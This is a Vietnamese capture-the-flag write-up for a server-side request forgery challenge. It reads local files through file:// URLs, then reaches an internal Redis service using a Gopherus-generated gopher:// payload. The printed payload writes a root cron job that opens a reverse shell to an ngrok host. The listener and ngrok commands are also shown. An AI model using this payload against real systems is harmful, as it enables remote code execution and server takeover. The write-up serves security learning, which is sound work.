# Server Side Request Forgery (Medium - 50 pts)

Ở đây có một form nhập input cho chúng ta nhập một URL bất kì.

Trước tiên mình thử với file:///etc/password:

![image](https://user-images.githubusercontent.com/83667873/151571913-85a6f796-b156-417f-840d-19a89d656577.png)

Nhiệm vụ của chúng ta bây giờ là cần phải thực hiện tạo payload sao cho có thể RCE để đọc được flag.

Mình thử kiểm tra port 6379 (chạy dịch vụ Redis) thì kết quả là timeout xảy ra, chứng tỏ port 6379 đang mở. Và redis đang running. 

Ở đây mình sẽ sử dụng tool Gopherus để general payload. Link: https://github.com/tarunkant/Gopherus

Trước tiên ở máy local mình sẽ thực hiện lắng nghe trên port 12345:

```
nc -lvp 12345
```

Sử dụng ngrok để public ra bên ngoài:

```
ngrok tcp 12345
```
![image](https://user-images.githubusercontent.com/83667873/151573955-00ec8f2a-f456-4241-a688-0b08b343ed69.png)

Sử dụng Gopherus để generate payload để thực hiện reverseshell:

![image](https://user-images.githubusercontent.com/83667873/151574551-3f33a4fd-2956-48d3-978c-8281d6e849e6.png)

Vì port do ngrok tạo ra cho mình là 13295 nên trong payload mình sẽ sửa port lại trước khi submit:

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/4.tcp.ngrok.io/13295%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```
Kết quả sau khi submit payload:

![image](https://user-images.githubusercontent.com/83667873/151575257-21adbf74-4f19-46fb-a2dc-e990d3273d42.png)

